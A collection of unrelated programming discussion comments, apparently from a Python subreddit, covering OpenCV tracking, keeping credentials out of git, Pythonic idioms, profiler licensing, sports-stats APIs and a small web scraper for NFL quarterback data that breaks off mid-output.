I'm doing a PhD in bioinformatics, I went and spoke to computer scientists who specialise in developing new tracking techniques for advice on what to implement so I know that what I needed was certainly not available in OpenCV or any of the other computer vision libraries available.
Comparison vs ratpoison?
You said that you're using OpenCV, I highly doubt a tracking application which uses OpenCV is outsourcing &lt; 1% to the library. As I said before, when you can use a popular algorithm implemented in C++ with bindings for Python, I agree it makes sense to use it. When you're doing research like I am, and you have spoken to computer vision researchers who have recommended the best technique and it isn't in OpenCV or other open source libraries, I didn't have any other option than to implement it in C++.
&gt; used deocde function to decode the bytes to the utf-8. You still haven't gotten it right. You are not decoding the bytes to UTF-8, the bytes are UTF-8 encoded and you are decoding them to Unicode. You really should take a look at the link I gave you.
What a curious rule. I wonder what made them formulate it.. /s
Interesting! Why did websockets get all the hype while I never heard of SSE? What are the disadvantages of them that made websockets necessary? And why do you prefer them to websockets?
And even then, R is a pain in the ass.
One simple approach with no dependencies is to add the *secret* variables to an external file, then import them from there. If you add this file to your `.gitignore` it will be ignored and not committed. I usually call this `local_settings.py` since it contains database passwords, etc. that are specific to the local system. You can then import these variables into your `settings.py` using: try: from local_settings import * except ImportError: pass The `except ImportError` allows it to pass without error if the `local-settings.py` file is not found, if that's useful (depends if your program can run without these additional variables). Final note, if you've *already* committed you need to remove the files not just from your current folder but also [from the git history](https://help.github.com/articles/remove-sensitive-data/). If you don't do this, someone can just browse back through the history and get the data there. Think about secure data before you commit, not before you push! 
&gt; You said that you're using OpenCV, I highly doubt a tracking &gt; application which uses OpenCV is outsourcing &lt; 1% to the &gt; library. Think like a developer, how many LOC of code account for most of the computation time (rememver to benchmark!)? A very small amount typically. Look, I have a PhD in robotoics and computer vision, and I work currently as a postdoc neuroscientist where I study vision and behaviour. I do research, every day. People wrongly think of OpenCV as a bunch of algorithms that do magic for them. At one end it could be seen that way (features, etc), but it is more useful as a set of accelerated image processing primitives from which you can build efficient versions of your own algorithms. That is how one should use python+opencv to 'develop my own tracking algorithms'. You are a bioinformatician, not a computer vision or tracking guy. If I was you, I would reevaluate your code in a few years and see if you would architect your application the same way you did. I expect if I tried to write my own bioinformatics code it might be average the first time around. I would also guess that I could make it comparibly fast with the rest of the world the next iteration. 
&gt; who know far more about this area than you or I ever will. Describe your tracking problem in Pseudocode and I'll offer an opinion. Are you going to behaviour2015?
Javascript for real world projects, RapydScript for a pythonic javascript. Then Hy, the lisp that transpiles to python AST, and Guile, the official GNU lispy extension language, because GNU Guix, the distro and package manager, bring new ideas.
Usually, because when dealing with systems, ctrl-c isn't what we clean for. Note that we also use set -e and pipefail in bash scripts to make sure that proper cleaning is done. When you need multiple cleanup jobs, you either allocate an array, or you use subshell bindings. Pretty much the same way in python.
In what way doesn't it feel Pythonic?
From the Zen of Python: "Explicit is better than implcit" ? 
Thanks!!!
But how explicit do you want to get? for a_variable_i_will_never_use in range(10): do_something() In code like this, using the underscore as counter instead is equally explicit/implicit as using a variable like `x` or `i` or whatever is used mostly.
For me _, name, _ = tup is more explicit than name = tup[1]. The underscored version asserts that the tuple is exactly length 3 as well as describing the intention to only use the name part of the tuple. 
I agree. The argument of explicit does not apply to all situations equally. In your example it's a great way of reducing noise. In the example from the blog post, where you use it for translation, I would be a lot less enthusiastic! Browsing through the code, you'd have to check the import, because the function has been renamed. something like `trans` would fit better perhaps. 
What is your definition of a block? Just a specific number of bytes? To read a file in chunks like this, you include the number of bytes in the read() call. To start from the end or an arbitrary point in the file, use the seek() method. By the way, the word is "simultaneously".
sounds more like you don't know what it means rather than it not having a meaning.
There is source in the package if you dig a bit. But, yeah, add the fact that Python byte-code is trivial to de-interpret for any one that cares, and it just makes the missing source repo more blatant. Killed my interest too.
As someone who never saw it before, I got it after seeing one code example with no further explanation. I don't see what your problem is...
&gt; 0D array a 0D array by definition has 0 elements. so what’s the difference to a 0-length vector or a 0×0 matrix?
And then what if you have a program called command? *BOOM*
I would like that even better if `...` would replace `*_`.
It looked interesting, and then I saw the license.
Did you write the script entirely in bash, or did you leverage things like `awk`, `sed`, etc.? When all I'm doing is gluing together a few command-line programs, I quite like bash. Once I need to start handling things like error conditions, branching, and logging, I start to reach for a more general-purpose language like Python.
Well, maybe they WANT the excuse to move to Go. Often times, a lateral move to new technology can be more productive than an incremental update to the existing technology. This is only true because of so-called "technology managers" though who truly don't understand what they're managing. They think that because the word "manager" is in their title that it is their job to get hold of the current revisions of everything and strangle progress in the name of "stability". In the meantime, the developers slowly build inertia towards busting them out of that lock-down and it's often easier to take the system in a whole new direction that the managers can't even grok yet. In short, it's development as standard guerilla warfare. Really, nothing has changed in the 20 years I've been doing this professionally. Ugh...
Nice API. Pity it's not more fully featured - I was looking for a library that could generically identify and scrape sites for content and comments a while ago for use in research, but couldn't find one and ended up having to write it myself. Looks like pointing this at sites will only grab content supplied by embedded RSS feeds?
In case you're not joking, it'd just be "command 'command'". Since command is shell built-in, it's always executed first when you call something by its name.... And since it's function is to find external programs by name, it doesn't really matter if one of those programs is also called command.
`for unused in range(10):` doesn't seem too bad to me ;)
Nope. It crawls forums, reviews and Q&amp;A sites (that usually don't have RSS), blogs and news sources that doesn't necessarily have an RSS feed. BTW, if you think of something missing to the API, you can always contribute ;)
I am also not a fan of the license, but it would be cool to see what Profilers people recommend. So, Pythonistas, what do you use?
Cool. Sounds like it might warrant some high performing languages.
That's type safety.
CSV has no concept of sheets. You could use a python library to write excel files, but the files won't be text any more.
Yes. Fortran, for those who still like to bang rocks together (which is a large majority unfortunately). Other people are moving to python, but very slowly. The problem is that there's so much legacy and so many old farts still attached to their comfy job that it's impossible to kick it out. A very large part of commercial and academic codes are pure Fortran 77, sometimes with 90 features in it. Sometimes, out of desperation, they need interfacing with C, so they end up having to write clunky adapters before the fortran committee came up with the BIND(C) directive, about 30 years too late... Thanks.. As someone said, humanity progresses one funeral at a time. In this case, one retirement at a time. 
Sure, that's what mods are for. Same thing happens in traditional forums all the time, although there the mods can move the thread, which works a bit better.
Or even dictionaries. Or, god forbid, classes; but we're not java savages. :)
Web does not work on my Xperia z3
Awesome write up! Interesting data points. I wonder how they collect all this data. 
This is what I do to store data.
That makes not much sense, but what company policies ever do?
That's a nice approach too, I'll try it out. Seems more pythonic.
Unfortunately all the files are saved as XLS
Well, I also wanted it open source (but unfortunately the crowdfunding didn't reach the needed level of funding for that: https://sw-brainwy.rhcloud.com/support/pydev-2014/ -- so, I just took the shot and kept it going in the hopes that it'll pay off). Also, I'm the author of PyDev, where everything I do is open source and try to keep on doing it through donations, so, definitely I get both sides of the equations (and I'm very fond of open source). Anyways, if you dump something which could make you more productive because it's closed source, I think that's fine too... (but note that it's closed source but open source projects can use it 'free' -- as long as it's acknowledged by the project). Also, I don't think there's any project out there that can currently compare (RunSnakeRun is only a profile results viewer and not able to attach to a running process or provide a live view such as PyVmMonitor, monitor multiple processes, have an API to work with it directly, etc.). 
it is probably worth mentioning that they might smile more in pictures *because* of success, and not the other way around.
IIRC that's the same in Haskell!
Or better yet pyrsistent records.
Hi there. You have posted a beginners question to /r/python, however it is far more suited to /r/learnpython, where users are actively interested in helping with beginner topics. Please resubmit it over there! Make sure to read their sidebar rules before posting, notably this one: "Posting homework assignments is not prohibited if you show that you tried to solve it yourself." Cheers &amp;amp; best of luck!
Nothing wrong with making money, or deciding to keep it closed source. My personal contention is you are offering a tool to improve my code with out offering me the ability to improve/extend/understand the tool. While I do use pycharm in when coding, it's not without a heavy heart and a license paid for by my employer. 
Well, I'd say that stored procedures don't make a great ETL approach because they put the processing burden on a database server - sometimes *the* database server. And this is one of the hardest components to scale up cheaply. Additionally, the stored-procedure languages are generally poor. So, I think Python is far better than stored procedures in general. Compared to other solutions, I'd say that any high-level, highly readable, general purpose language will be better than an ETL tool if being used by programmers. For several reasons: unit testing, ci, documentation, flexibility and attractiveness to programmers. Python's only challenge is in speed. But for years I've used to it process hundreds of millions of heavy ETL transforms a day on old &amp; small servers. So, you have to put a little more thought into it when it comes to larger data volumes, but there are a number of simple &amp; effective ways to achieve parallelism if it's necessary.
Also the old statement: correlation doesn't necessarily imply causation. 
Plus he only used one photograph for each QB. What about players who don't normally smile in there photo's but did in the one that was chosen for this study? Also because he collected the photo's by hand there is a chance of a selection bias. IE his guy placed 3rd. This leaves me wondering how you would write a web scraping program to overcome these two problems?
Thanks for posting this, ... is there a limit to the number of api hits you can make on the NBA API? ... there's probably a better place place to ask than here, but before I go trying to query all data on all players...figured I should probably find that out haha
I haven't had any trouble so far and went through two hundred plus players quite a few times.
Good to know ... I am always paranoid about abusing APIs (even though I never have). Anyway thanks again for posting this
Sounds kinda like [Terraform](https://terraform.io/)?
You should prefer using "with" when dealing with files. Then you can not forget to close one as you did for the reading part 😉 
Finally got sometime to go through the whole thing. thanks.
 STUDENT_ID, CLASS_ID, FIRST_NAME, LAST_NAME = range(4) #capitals commonly define constants # student id, Class id, first,last names students = [ [0,0,'bob','smith'], [1,0,'jane','someperson']] classes = [ [0,'biology'], [1,'physics'] ] for cls in classes: cls[CLASS_ID] #no-go CLASS_CLASS_ID, CLASS_NAME = range(2) for cls in classes: cls[CLASS_CLASS_ID] #no-go because the enum isn't connected to the data, so it can affect other parts of the code, and requires an un-needed work around (the enum for students, blocks off the use of CLASS_ID for the classes) 
Holy crap, what a brilliant post.. read every line... bookmarked for reference later... 
&gt; Like, what is it that I could do so much better in Lua than in Python? Game development and/or scripting. Lua is a lot faster and smaller than equivalent Python, especially with LuaJIT. But mostly, I really like to use both Python and Lua because while there are a lot of similarities, there are also a lot of differences, especially in what constitutes idiomatic code.
I'm still not certain that I get the question. I see it as kind of like asking, "I've got eight musical notes. What can I do with them that Beethoven and the Beetles haven't done?"
I'm looking for actual projects that have been done, or could easily be done with available tools. More like, I have these three chords, what songs can I play? (Any Nirvana song). Most of what I find for python is being used for non business or larger uses. I'm just curious what small business uses people have done, if any.
You could use a forklift to type, though I don't think this is common.
I've developed and deployed a Python-based system that interfaces with a digital truck scale, produces bills of lading for trucks leaving the plant, takes the measured weight difference and pumps that into... ...a thin client inventory/invoicing system also written in Python. Is that kind of what you were looking for?
Fabio, this is an awesome, very valuable tool. Being able to profile visually and in real time is a big leap fwd in terms of what's out there. The [yappi profiler](https://code.google.com/p/yappi/) integration is the bees knees, and being able to hook up to an already running process is terrific. That's an excellent product and a great contribution!
Well, if you use python because it's cool, then your answer to "When should you not use Python" is probably something like "Only when there is another cool language that solves my specific problem better".
Nothing fancy. Just straight text out to a dot matrix printer printing on multi-part carbonless pre-printed forms.
This looks interesting, and would work great as an py.test plugin. Another thing I'd like to have is some place to put additional information about why the test is failing that's not shown by py.test -s (-s is needed to make pdb.set_trace work).
Nice. Simple is good. Dot matrix sure beats pdf!
Rather than taking a bike apart, consider taking it for a ride? Fabio develops some of the most complex, sophisticated python dev tools. Looking into the code of that, is like staring into a vast deep abyss. Personally, I'm more than happy to shell out a few bucks to someone who has so generously contributed to python, and for a product that's amazing and totally worth it. Python is an highly productive language, and tools like pydev, pycharm and possible pyvmmonitor make it amazingly productive and enjoyable.
Glad to see someone else write 'Pythong'. I do it all the time in terminal.
Pycharm needs a profiler integration... maybe they license...
Again, I have faced similar situations, and I just make a lot of tests. But each case, so, you might have a point, but I can't see it.
Right, but assigning to it is a SyntaxError. They are talking about assigning to ellipsis meaning discard the result. E.g., `..., a, *b = some_iterable` would be equivalent to `a = list(some_iterable)[1]; b = list(some_iterable)[2:]`
That's fine. I'm just looking for real world examples that have worked.
I didn't realize NBA.com provided APIs like this for their data. I currently scrape everything off of ESPN, which has been kind of a pain since they seem to change their structure at least once or twice a year. It looks like NBA.com doesn't officially support the stats being used outside of their site. Have you run into any issues with them changing the APIs?
I am not alone!
I swear I'm not thinking of thongs while I code!
Yeah that's what I mean.
I've been using it since 2012 and little has changed. [Here](http://nbviewer.ipython.org/github/ltiao/notes/blob/master/NBA%20Stat%20Resources.ipynb) are some more examples with a few more endpoints if you are interested.
This is great, thank!
I think it's always a good idea to learn new languages, but maybe you'd be more interested in languages like Haskell, Forth, J or Prolog, because they're very different to Python, so there's a lot of new concepts and computational models to learn with them.
This is beautiful
This is pretty cool. Is there a an easy way of scraping the shot charts data? I know it's possible, the guy who made [this](http://peterbeshai.com/buckets/app/#/playerView/201935_2014) was able to do it.
Yes
I can see how that gets very frustrating. Are you still looking at the moment? What kind of things do you like building and have you tried contacting London based recruiters? You could probably make more money, you might have to fly in for interviews and meetings but you would probably still be better off. Lots of travelling though. 
Not sure where the shot coordinates are coming from but that site looks great.
Was going to comment the same thing, I see by this one and the replies that I am far from alone. Awesome! Haha.
Looks interesting but unfortunately tied to a paid service. 1000 free searches per month is minuscule even if you are hacking something small together. I'd probably just write my own parser or use other code rather than learn an API for something that is likely going to end up getting expensive to use if my ideas were to gain any sort of traction.
is it down? i can't access the website
Sure Pandas is a fine choice but for clarity sake the Excel reading does depend on on xlrd. https://github.com/pydata/pandas/blob/master/pandas/io/excel.py#L150 For writing one could use: - openpyxl (Pandas dependency) - xlwt (.xls only) - xlsxwriter (latest, greatest) 
I did something similar with the NFL standings and playoff picture this year. I even had it generate markdown tables that could be used in subreddit sidebars (that was the initial goal).
FYI: "`...`" is not just a name. You can never assign to it anyway, but you're right that it might be weird to see `...` keep its sentinel value after assignment. Maybe `None` would be better?
Oh man... This screwed me up hard too. You basically have to initialize a time object with a zone before it tells you the right offset. 
Pythong.org exists for people like yourself. It's extremely mild but if you work with prudes *possibly nsfw*
Thank you, thank you! I've seen this package before, long time ago, and I thought it's amazing if only for its clever hack that makes the `from sh import whatver` work. But then I somehow lost every reference to it, and it proved impossible to find, neither on Google nor on PyPI, with any combination of keywords I tried. (Naming a package `sh`? Honestly! Who does that?) That's until today. Thanks again!
Note: Though there are still [half-hour timezones](http://www.timeanddate.com/time/zones/ist). :-)
&gt; Have you seen UrWeb and it's ability to compile and verify database-driven websites? &gt; No, looks interesting. &gt; &gt; Yes, very interesting, you change the number of columns returned from a SQL query and it knows the parts of code that must change based on that. &gt; I haven't seen TodoMVC. Looks like it is for JS only though? Moya can serve Javascript, but it's not a Javascript framework. Any modern web app is highly responsive and based primarily on Javascript wouldnt you say? Yes, TodoMVC is primarily for Javascript. Server-side dynamic HTML is a step beyond the curve. client-side javascript rendering is where it's at. That's why ScalaJS impresses me so much. &gt; What does the calculator example do? It creates a RPN calculator. You write the whole thing in Python using Nagare but Nagare creates the Javascript hooks. 
This looks tremendous. I look forward to checking this and the rest of your blog out at work tomorrow. 
And [15 minutes](http://www.timeanddate.com/time/zones/npt) too
link doesn't work! :(
Whenever Bash will do nicely.
&gt; "Anyone else doing the pythong course"
I actually do.
Well, what about ClojureScript?)
Exactly what @jelief said
Well I guess its not really the language. its fine to work with, I prefer it to Java solely for LINQ, but its such a hand holdy set-up. I mean it saves lots of time writing code with all the templates and what not but I spend more time looking for the button I need in the visual studio menus than I do actually coding. 
You mean like a dictionary with objects as values and their pin number as the key? Yeah that's what I was thinking too ;-)
the only thing that's really variable in your code is those list of numbers. How about something like this: n = ['0.00', '0.01', '0.02', '0.03', '0.04', '0.05', '0.06', '0.07', '0.08', '0.09', '0.10', '0.11', '1.00', '1.01', '1.02', '1.03', '1.04', '1.05', '1.10', '1.11'] o = [object() for i in range(len(n))] .... self.input_dicts = OrderedDict(zip(n,o)) ... self.inputs = [IO.IO(window=v, name=k) for k, v in self.input_dicts.items()] 
And [even worse than that](http://youtu.be/-5wpm-gesOY)
This is the exact solution I was looking for. Unfortunately, it needs to be an ordered dict. Dammit.
Hi, Ernesto here, from Tryolabs elasticseach-py works with python 3. (https://pypi.python.org/pypi/elasticsearch/1.4.0) This tutorial was made with Python 2.7, but I'm sure it should work perfectly with Python 3. The other packages I'm using are requests and json. Both are Python 3 compatible. 
Can't generate those names sequentially, because those inputs do not physically exist. It is the manufacturers' naming convention. But I like the idea of having them at a module or class level, where that specific micro controller can be subclassed with its specific pinouts.
This is really nice as well. Same result, but much more concise. It also allows for an ordered dict.
Good to know! Looks like there have been quite a few fixes, although there doesn't seem to be much progress towards modernization.
It's a cleaner API for the tests. The call to assert_expectations() is moved out of the tests and into a local contftest.py plugin. 
[It seems that tablib will let you create excel files with multiple spreadsheets.] (http://docs.python-tablib.org/en/latest/tutorial/?highlight=sheets#excel-workbook-with-multiple-sheets) I haven't used this functionality, but I've used tablib for creating CSVs and have found it good.
So make it ordered. Build it with a set-comprehension into an ordered dict.
The post has some very good advice. What stood out was: &gt; You don't have to worry about special characters interpreted by the shell. There's a wealth of security concerns here too. Using the `sh` and `subprocess` workarounds are handy, but they do carry some very weighty security concerns. By avoiding these, you side-step a lot of potential injection vectors as well, akin to SQL injection attacks. And if your program is to run in a well secured Linux/Unix environment, mandatory access controls (e.g. SELinux) will likely disallow arbitrary execution of shell commands from your process anyway.
&gt; (but note that it's closed source but open source projects can use it 'free' -- as long as it's acknowledged by the project) The advertising clause is exactly why the 4-clause BSD license is completely useless, same thing here.
PyPy does support a significant subset of numpy (enough to run this code) so please don't spread FUD
Don't forget that many do not use the web interface. Posting right now from what was Alien Blue. As it is, I'm still not sure that this policy is in the best interest of the reddit. First; not many homework question have come this way. Second; we really need to consider the mental state of somebody that would complain. Frankly it is like somebody buying a newspaper and then getting upset over an article in the paper - you don't need to read what doesn't interest you or upsets you. In a nut shell I have a far greater concern about the people complaining then I do over the few "homework" posts that slip in. I quote homework here because there seems to be a tendency by the self important to declare anything they don't want to read to be a homework post. 
yeah, I've reported a bunch more lately too.
They are using Stackless Python. A different beast than CPython. The modern sucessor of Stackless is PyPy.
I believe it's more that Python doesn't look like C. So few C/C++ devs get into/expend effort on it. Much prefer Lua cause it "feels" like C. Yes there are polygots, but vast majority of devs I've encountered have comfortable spot, and Don't like moving from it.
AutoModerator is pretty great, thanks Deimorz for working on it ! But when I said inefficiency I also meant beginners having to repost stuff quite frequently. I would say that's a sign that the subs' purpose isn't easily apparent. 
Horrible website for mobile. There is a thick black border on the left hand side of the screen covering a lot of the text.
Yeah, sidebar covers stuff up. Can't read.
Great examples. Thanks! That is my goal in learning Python as well. I want to automate the generation of reports and reminders for customers. Also, I want to use it to get into IoT and report inventory levels (when used with an 8 bit onsite micro). My big idea is to make an app that will calculate waste and the value of that waste if sold (like grease) or turned into energy or bio products. I did my thesis on this and envisioned the app before I ever imagined that I would one day just learn to code it myself. For instance, a garage could use the calculator to see whether they would make more selling waste oil or burning it for heat (compared to other heat sources). There are a lot of things to learn to get to that, so I was looking at doing smaller projects to build up the skills, and I can sell these products to small businesses along the way.
I find that often I learn "the right thing to do" and stick to it, 5 years later I may not immediately recall why it was the right thing to do. Then I find myself in some obscure situation I'm rarely in and I have to decide what the right thing to do is. Sometimes that decision is better informed if I have at the forefront of my thinking the original principles that make up all my collection of "right things to do". So I love reading these posts from folks to help me reinforce the principles, rather than just having a collection of dogmatic "best practices".
It is cleaner but more fragile. Could there's be a more reliable way to do it?
This seems like it may be an ["xy problem"](http://xyproblem.info/). Could you explain what your overall goal is?
Probably, I think so. I've got some feedback from a couple people experienced with developing pytest plugins, and I will be incorporating their advice into future versions.
Ok. Thanks for the clarification. Yes. I would love to get there. Essentially I'm doing the 'plain' now. I think it may be possible to add the 'reinterp' version with not too much trouble. And I think that would be a good idea. The 'rewrite' model, arguably the coolest part of pytest, is more difficult. My initial reading of the pytest source indicates (I hope I'm wrong) that I will need to do some similar abstract syntax tree manipulation to get that to work. As I am really not experienced in that, I'm hoping I can convince a core pytest developer to help me with this part of it once the plugin is further along. I was considering going down the route of nose and unittest with things like expect.equal(), expect.not_equal(), expect.less_than(), etc as a first pass. But that seems a bit icky. Especially since it's kind of evil to have those, and then remove them once the rewrite or reinterp functionality is in place. 
Yeah, the whole new-to-reddit experience is pretty lacking in many ways. It's something we're approaching from a variety of angles.
It certainly feels like an XY problem, that's why I'm asking. I have many working solutions, but it feels like a bunch of DRY, where something like a factory or dict comprehension could apply without being cryptic. But anyway, more verbosity. I have a micro-controller, more specifically a PLC. IO (physical pins) are named as 1.00, 1.01, 0.06, etc by the manufacturer. I want these names to appear in a GUI that a user sees when troubleshooting a problem. Specifically, whether or not a state is high or low. I need to change an icon from a gray LED to a green one. A PLC can gain or lose IO depending if you add modules. Pin names ARE NOT sequential and I cannot change them. It would be bad, imo, to name them anything other than what is printed on the PLC, as it would confuse the user. Unfortunately, you can't have an object named with a '.' (input1.2.1 ain't gonna work) so I am using underscores. Originally, I wanted the following: input_list = [ self.input_0_00 = IO.IO(window=self, name='1.00'), self.input_0_01 = IO.IO(window=self, name='1.01'), self.input_0_02 = IO.IO(window=self, name='1.02'), self.input_0_03 = IO.IO(window=self, name='1.03'), ...] But you can't instantiate in a list. Why can't I make the variables based on a list of the input names? This is exactly why you would use a dict. But you CAN'T do: input_dict = {'1.00': self.input_1_00 = object()} Either way, you need to create an object before it goes in a list or dict. That's why I made a bunch of empty objects prior to creating the dict. Which feels REALLY wrong. So now, I think it's getting too convoluted, but have to continue down a path to see how it pans out. Perhaps genius will strike. It never does, hence my username. It also HAS to be an ordered dict, because when the PLC communicates back what pins are OFF or ON, it is in a specific order, it does not change. I am getting back something like 000100100100001111100010010010. Now I could poll each pin sequentially, but the delay becomes significant for higher pin counts. It's easier to get back a string. So then when I create the ordereddict I can use that to individually instantiate an IO object with certain parameters, such as its name, and then append it to a list. But really the only thing I'm using the dict for is the key (to pass the name in X.XX format. I also need the name to load settings from configuration files. Going in circles right? At this point it felt far easier to go back to the original list, and make the entries as needed, because I would need to make yet another dummy object() anyway or instantiate an object and then add it to a list. But again, I'm back at the beginning. Now I know I'm out of the pythonic zone and things really don't seem right. So I trudge on. Back to the program. Once I get poll results back, I run through each one of the IO objects in the list, using the 1001000100100 string. Since they are all in order, I can use the 1 or 0 to turn the GUI LED OFF or ON. The factory option by /u/Darkmere is exactly what I wanted, but I couldn't for the life of me remember the pattern or name. It is very readable and will allow for adding additional IO, just by adding strings to an original list. /u/scottious had a great one too, but I could use the factory pattern to do more prior to returning the object.
&gt;This type of question is always tough to answer for me, because as someone that has a good bit of software engineering experience, my first inclination is to answer this with "because it's the right thing to do, geez!!!" &lt;arms flailing around&gt;. Me too. I kind of "don't get it". Are these kinds of questions some kind of devil's advocate designed to make SO into a nice reference point, or do people genuinely think that running and parsing the output of unix specific shell commands instead of using the library that already does it is a great way to write python code?
I would recommend leaving as much code there as possible and ommit passwords and creds only. A really awesome and quick way to do this is get a clean branch, commit a template for a config file containing all your parameters, with dummy values, something like [redacted]. Then you commit that, that's your template. Now you pull from master, and get another clean branch, make all your changes to the config file and then do a git stash. This will stash the changes to your config file in your local git index, and won's show up in your changes, that way you can work on your branch and base your config file on and off your branch, and remove the stash before pushing to your remote branch or master on github. Here's some links for reference http://git-scm.com/docs/git-stash You'd do something like git stash, git stash apply --index, git stash show -p | git apply -R. And you can view your index by doing git stash list, you can remove stashes from the local index by doing git stash drop &lt;indexkey&gt;
&gt; I've never been able to make a full project besides something that is in a command line. What are you defining as a "full project"? If you're looking to get away from the command line, then maybe python is not for you. What do you want to do? You have to figure that out first. After I learned the basics of python, I wanted to have some fun, so I worked my way through [Violent Python](https://docs.google.com/file/d/0B-F3NpsEIXCYcDZaUXhfdXlFM1k/edit) and then learned how to use the [requests](http://docs.python-requests.org/en/latest/) and [BeautifulSoup](http://www.crummy.com/software/BeautifulSoup/) modules to build web-scraping programs for fun. In learning these I learned a lot about python and how it can work with the internet. I think your answer is to figure out what you want to build.
Keeping the B in BDFL
Gotcha, I agree that working octave or R makes you think with the vector mindset where loops are inherently slow. How would you best describe a dataframe then? Like a lists of lists but also with a dictionary-like interface?
Pick a goal. Find a type of application you use frequently, such as a music player. Rewrite its functionality in python. 
It was the unresponsiveness and lag that killed it for me.
But are you doing anything fancy in the Excel file? If it's just a bunch of hard-coded numbers, you can always just save it as CSV from Excel and use Python's built-in csv module. 
Hmm you're probably right, but oddly I find Ruby messier and less readable than Perl.
My initial reaction was somewhat similar. "If it's not immediately obvious to you why you should use the Python functions, maybe you shouldn't be developing software." But of course, there was a time when I didn't know this, either, and it didn't stop me.
That, and it's actually always good to ask yourself why you do something rather than blindly trusting "because it's bad durr". No, writing strings of commands isn't great... but that's not reason enough. The first answer on SO is excellent at highlighting why it's not just meh, it's truly bad.
What are you interested in? What do/did you like in school? What do you do for work? There are plenty of full projects that are "just command line". I've never made a gui in 6+ years (okay, once, and it was cool) and I dislike even having to write html/css when it comes up. If you want to do visual stuff, consider rendering opengl (pyglet), visualizing data (matplotlib, bokeh, mayavi), image manipulation (opencv, numpy) or web stuff (django or flask and html/css/javascript)
Try jedi and remember to set your interpreter, I get completion for all of the packages I use and its a simple set up. 
one other interesting point that I don't think they mentioned is that the os.system and every subprocess variant I've found does the standard fork/exec combo that causes a complete copy of your address space to be made before it gets dumped and replaced with the new executable. This copy can take a loooooong time if you are using multiple Gigs of ram when you issue the os.system(). It also seems to pause all the threads in the parent process until the copy completes. I'm using RHEL6, so python 2.7 and it doesn't seem to allow access to vfork which avoids the copy.
Where would I put the time.sleep(5) in my code?
It's true that `vfork` is faster than `fork`, but simply forking does not copy any memory on any system with virtual memory support (i.e, everything except embedded devices). Instead, the parent and child share vtable entries until one of them writes to a shared page, in which case that particular page is copied and the writing process' vtable entry is modified to point to the copied page.
Hi there. You have posted a beginners question to /r/python, however it is far more suited to /r/learnpython, where users are actively interested in helping with beginner topics. Please resubmit it over there! Make sure to read their sidebar rules before posting, notably this one: "Posting homework assignments is not prohibited if you show that you tried to solve it yourself." Cheers &amp;amp; best of luck! _____ I noted you got your answers here (that's great) and I hope that the next time you post, you try /r/learnpython (and subscribe there!) for the answers that you need.
Dataframes are sorta weird. I'd describe them as "fucking convenient." Under the hood: yes, they're basically a list of lists. But I'd be more inclined to describe a matrix first, and then be like "wouldn't it be cool if the rows and columns could take labels? And if you weren't constrained to a single datatype for the entire object? That's a dataframe!"
I understand what you mean to some degree. A lot of what I learn / do, I do because I need it for my job. I doubt I ever would have set up a mail server or LDAP server in my spare time at home "for fun." If I didn't have work to keep me occupied with stuff to learn/master, and I still wanted to program, I would look into game programming. Because why not? Games are fun.
￼ Guido van Rossum's Code Review and Ghost Ship mission update ￼ Hello, sailors of the code-sea, You remember Guido van Rossum? Yeah, that guy who created Python. He visits CheckiO from time to time to review some players solutions, check out some of his latest reviews: Sim0000's elegant solution gets even better with Guido's advice, Guido gives advice on the Network Loops task, noting good usage of the defaultdict(set) function, Last year's Cake Rows publication get optimized with a little Guido magic. Arrrr, guess what? Ghost Missions are back! Tack down the fabled Pirate Ghost Ship Missions with CheckiO. These Ghost Missions are coming back as part of a non-stop CheckiO explosion! You can now compete in these missions on the Codeship Island. So, those missions are: ￼Ghost Detect: Nobody can see other ships after they witness the Ghost Ship, so now you need to write a locator program in the Ghost Detect mission.￼Safe Coasts: Your target is to make a detailed map with defined safe zones based on regional map and the locations where Flying Dutchman typically appears. Not only you can now complete in the Ghost Detect mission, it's also become a Code Golf mission! 
Copied from the site so I could read it.
http://blog.gosquadron.com/use-tls
Fortunately yes :) Rhel/Centos yum install nginx Ubuntu / Debian apt-get install nginx 
ik this is python but zoneminder is epic too :D if you could get this app to where zoneminder is @ i'd be very very impressed ;) and would even consider switching :) 
This probably won't help, but I wrote this: http://pyratesarecool.appspot.com/Pyglet_and_pymunk_tutorial
Probably at least partially true really. Boo was always the least popular language for Unity, despite having roughly same performance characteristics as unity script; people just didn't like it. 
Yeah, typo.
You're the 2nd person to suggest this to me - thanks, it's on my to-do list!
Actually I made a mistake - it's not actually Debian Wheezy - it's something called Raspbian which is based on Debian Wheezy. Looks like there are people running Jessie on the pi though, so upgrading shouldn't be a problem.
Heh. I don't think this will work for my use case. I need to distribute this to users that don't have root access. Can I install nginx on a per-user basis?
Pygame is based on sdl, right ? So check out lazyfoo.
Have a look at the pocoo projects like Werkzeug, jinja2, pygments, Flask and so on...
You mentioned you had to manually download all the player images and stats, which is why you limited it to 63 players. It would be fairly easy to write a web scraper in Python to automatically download all the player data, fwiw / if you're interested in doing more analytics on player data. import bs4, requests soup = bs4.BeautifulSoup(requests.get('http://www.nfl.com/stats/categorystats?tabSeq=1&amp;season=2013&amp;seasonType=REG&amp;d-447263-p=1&amp;statisticPositionCategory=QUARTERBACK&amp;qualified=true').text) rows = soup.find('table', id='result').find_all('tr') header = [el.text.strip() for el in rows[0].find_all('th')] players = [ (el.find('a').attrs['href'], [ td.text.strip() for td in el.find_all('td') ]) for el in rows[1:] ] def download_player_photo(filename, profile): profile_soup = bs4.BeautifulSoup(requests.get('http://www.nfl.com' + profile).text) url = profile_soup.find('div', 'player-photo').img.attrs['src'] with open(filename, 'wb') as out: out.write(requests.get(url).content) Scraper results for QB page: Url, Rk, Player, Team, Pos, Comp, Att, Pct, Att/G, Yds, Avg, Yds/G, TD, Int, 1st, 1st%, Lng, 20+, 40+, Sck, Rate /players/peytonmanning/profile?id=MAN515097, 1, Peyton Manning, DEN, QB, 450, 659, 68.3, 41.2, 5,477, 8.3, 342.3, 55, 10, 289, 43.9, 78T, 68, 13, 18, 115.1 /players/drewbrees/profile?id=BRE229498, 2, Drew Brees, NO, QB, 446, 650, 68.6, 40.6, 5,162, 7.9, 322.6, 39, 12, 244, 37.5, 76T, 67, 15, 37, 104.7 /players/matthewstafford/profile?id=STA134157, 3, Matthew Stafford, DET, QB, 371, 634, 58.5, 39.6, 4,650, 7.3, 290.6, 29, 19, 221, 34.9, 87, 62, 10, 23, 84.2 /players/mattryan/profile?id=RYA238179, 4, Matt Ryan, ATL, QB, 439, 651, 67.4, 40.7, 4,515, 6.9, 282.2, 26, 17, 225, 34.6, 81T, 44, 9, 44, 89.6 /players/philiprivers/profile?id=RIV651634, 5, Philip Rivers, SD, QB, 378, 544, 69.5, 34.0, 4,478, 8.2, 279.9, 32, 11, 230, 42.3, 60T, 